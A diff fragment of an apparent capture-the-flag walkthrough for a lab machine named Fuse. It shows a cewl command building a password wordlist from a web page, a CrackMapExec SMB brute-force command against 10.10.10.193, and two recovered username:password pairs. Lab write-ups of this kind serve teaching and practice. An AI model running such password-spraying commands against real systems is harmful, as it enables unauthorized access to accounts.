@@ -130,9 +130,23 @@ Nmap done: 1 IP address (1 host up) scanned in 53.49 seconds
 
 ## Generate Passwords to Brute-Force
   - Cewl: Crawl the website to gather words which can be used as potential passwords.
-  - 
 ```CSS
 ▶ cewl -d 7 -m 8 --with-numbers -w cewl.out http://fuse.fabricorp.local/papercut/logs/html/index.htm
 ```
+
+---
+
+## Brute Force Usernames and Passwords
+  - CrackMapExec
+```CSS
+▶ crackmapexec smb 10.10.10.193 -u users.txt -p cewl.out
+```
+Credentials:
+```CSS
+bhult:Fabricorp01
+tlavel:Fabricorp01
+```
+
+---
 
 
